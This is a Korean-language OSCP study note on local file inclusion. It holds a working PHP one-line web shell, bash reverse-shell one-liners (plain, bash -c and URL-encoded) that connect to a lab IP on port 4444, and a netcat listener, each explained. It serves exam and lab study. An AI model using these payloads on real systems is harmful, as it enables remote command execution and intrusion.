---
layout: post
title: 9.2. File Inclusion Vulnerabilities
subtitle: 파일 인클루전
author: 마준영
categories: oscp
tags: 
top: 0
---
## 9.2.1. Local File Inclusion (LFI)

LFI취약점은 언뜻 보면 디랙토리 트래버셜과 비슷해보이지만 차이가 있다.
1. 디렉토리 트래버셜 : 웹 서버의 웹 루트 외부에 있는 파일 내용을 읽는 데 사용됨.
2. LFI : 애플리케이션의 실행 중인 코드에 파일을 포함 시킴.
   이로 인해 파일을 실행하거나 비실행 파일의 내용을 표시할 수 있음.
결론 : 디렉토리 트래버셜은 정보를 수집한다면, LFI는 RCE의 역할을 수행한다고 볼 수 있다.

#### 관련 코드 및 명령어
1. PHP 한줄 웹쉘
   ```php
<?php echo system($_GET['cmd']); ?>
```
2. 리버스쉘
 **1. `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1`**

- **기능**:
    
    - Bash를 인터랙티브 모드(`-i`)로 실행하고, 표준 입력, 표준 출력, 표준 에러를 리디렉션하여 원격 서버(192.168.119.3)와 TCP 연결을 생성.
    - 포트 4444에서 연결이 이루어지면 공격자는 원격 시스템에 명령을 실행할 수 있음.
- **주요 특징**:
    
    - **직접 실행**: Bash 환경에서 바로 실행 가능한 간단한 명령.
    - **제약 사항**:
        - 시스템이 기본적으로 **Bash 셸**을 지원해야 함.
        - 명령이 Bourne Shell(`sh`)로 실행되면 호환되지 않음.

---

 **2. `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"`**

- **기능**:
    
    - Bash를 실행하면서(`bash -c`) 추가 명령(`bash -i ...`)을 **인수로 전달**.
    - 전달된 명령은 Bash 내부에서 실행되므로, Bash 명령이 직접 실행되지 못하는 경우에도 실행 가능.
- **주요 특징**:
    
    - **더 높은 호환성**:
        - Bourne Shell(`sh`) 환경에서도 Bash 명령을 실행할 수 있도록 함.
    - **실행 방식**:
        - Bash를 사용해 명령 문자열 전체를 실행하도록 명시.
- **사용 이유**:
    
    - 기본 셸이 Bash가 아닌 경우에도 명령이 실행되도록 보장.

---

**3. `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`**

- **기능**:
    
    - `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` 명령을 **URL 인코딩**한 버전.
    - URL 인코딩:
        - 공백(`%20`) 및 특수 문자(`>`, `&`)를 인코딩해 웹 브라우저나 특정 URL 기반 시스템에서 사용할 수 있도록 함.
- **주요 특징**:
    
    - **웹 환경**에서 명령 전달:
        - 공격자가 웹 기반 LFI(Local File Inclusion) 또는 RFI(Remote File Inclusion) 취약점을 통해 악성 명령어를 전달할 때 사용.
    - **용도**:
        - 웹 애플리케이션에서 공백 및 특수 문자가 제대로 처리되지 않을 때.

---

### **비교 요약**

|명령어|실행 방식|용도 및 특징|
|---|---|---|
|`bash -i >& /dev/tcp/...`|Bash 환경에서 직접 실행|간단하고 바로 실행 가능, 기본 셸이 Bash일 경우.|
|`bash -c "bash -i ..."`|명령을 Bash로 전달|더 높은 호환성 제공, 기본 셸이 sh일 경우에도 실행 가능.|
|`bash%20-c%20%22bash...`|URL 인코딩된 명령|웹 기반 공격 시 사용, LFI/RFI 취약점 활용.|
   ```shell
   bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
   bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
   bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
   
```
3. Netcat을 이용해 리버스쉘 대기
   - **`nc`**:
    
    - Netcat 실행.
- **`-n`**:
    
    - DNS 이름 확인 없이 **순수 숫자 IP**를 사용.
    - 더 빠르고 간단하게 연결을 처리.
- **`-v`**:
    
    - **상세 모드**(verbose mode).
    - 작업 내용을 자세히 출력(예: 연결 상태, 수신된 데이터).
- **`-l`**:
    
    - **수신 대기(listen)** 모드.
    - Netcat이 클라이언트의 연결 요청을 기다림.
- **`-p 4444`**:
    
    - 특정 **포트 번호(4444)**를 지정.
    - 클라이언트가 이 포트로 연결을 시도.
   ```shell
   nc -nvlp 4444
```
